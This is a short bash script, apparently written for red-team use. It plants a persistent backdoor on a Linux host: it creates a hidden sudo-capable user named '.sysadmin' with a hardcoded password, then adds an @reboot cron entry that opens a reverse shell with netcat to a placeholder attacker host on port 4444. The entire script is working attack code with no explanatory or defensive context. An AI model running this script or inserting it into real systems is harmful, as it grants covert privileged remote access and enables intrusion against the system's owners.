#!/bin/bash
# Add hidden user
useradd -M -s /bin/bash -G sudo .sysadmin
echo ".sysadmin:RedTeam123" | chpasswd

# Setup reverse shell
(crontab -l ; echo "@reboot /usr/bin/nc -e /bin/bash attacker-ip 4444") | crontab -
